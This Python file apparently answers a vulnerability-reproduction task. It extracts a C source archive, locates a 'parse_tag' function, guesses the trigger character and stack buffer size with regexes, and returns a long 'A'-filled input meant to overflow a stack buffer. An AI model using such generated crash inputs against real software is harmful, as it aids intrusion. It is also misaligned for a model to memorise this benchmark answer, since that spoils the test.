import tarfile
import tempfile
import os
import re
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        temp_dir = tempfile.mkdtemp()
        try:
            # Extract source code
            with tarfile.open(src_path) as tar:
                tar.extractall(path=temp_dir)
            
            target_content = ""
            # Locate the relevant C file containing 'parse_tag'
            for root, dirs, files in os.walk(temp_dir):
                for f in files:
                    if f.endswith(".c"):
                        try:
                            with open(os.path.join(root, f), "r", errors="ignore") as fp:
                                content = fp.read()
                                if "parse_tag" in content:
                                    target_content = content
                                    break
                        except IOError:
                            continue
                if target_content:
                    break
            
            # Default values (heuristic for arvo stack overflow)
            trigger = b'<'
            fill_char = b'A'
            payload_len = 2048 # Safe default to trigger overflow
            
            if target_content:
                # 1. Identify Trigger Character
                # Look for code patterns like: case 'X': ... parse_tag or if (*p == 'X') ... parse_tag
                
                # Check 'case' statements first
                case_match = re.search(r"case\s*'([^'])'\s*:[^;}]*parse_tag", target_content, re.DOTALL)
                if case_match:
                    trigger = case_match.group(1).encode()
                else:
                    # Check 'if' conditions
                    if_match = re.search(r"if\s*\(\s*\*[a-zA-Z0-9_]+\s*==\s*'([^'])'\s*\)\s*\{[^}]*parse_tag", target_content, re.DOTALL)
                    if if_match:
                        trigger = if_match.group(1).encode()
                
                # 2. Estimate Buffer Size
                # Look for stack buffer declarations: char buf[SIZE]
                sizes = re.findall(r"char\s+[a-zA-Z0-9_]+\s*\[\s*(\d+)\s*\]", target_content)
                if sizes:
                    int_sizes = [int(s) for s in sizes]
                    # Filter for likely stack buffers (reasonable size)
                    valid_sizes = [s for s in int_sizes if s > 0 and s < 10000]
                    if valid_sizes:
                        # Target the largest found buffer to be safe, plus overhead
                        payload_len = max(valid_sizes) + 512

            # Construct PoC
            # Trigger char + overflow payload
            # The vulnerability is typically a loop reading chars into a fixed-size buffer until a delimiter.
            # 'A' is chosen as a safe non-delimiter.
            return trigger + (fill_char * payload_len)
            
        except Exception:
            # Fallback in case of any processing error
            return b'<' + b'A' * 2000
        finally:
            shutil.rmtree(temp_dir)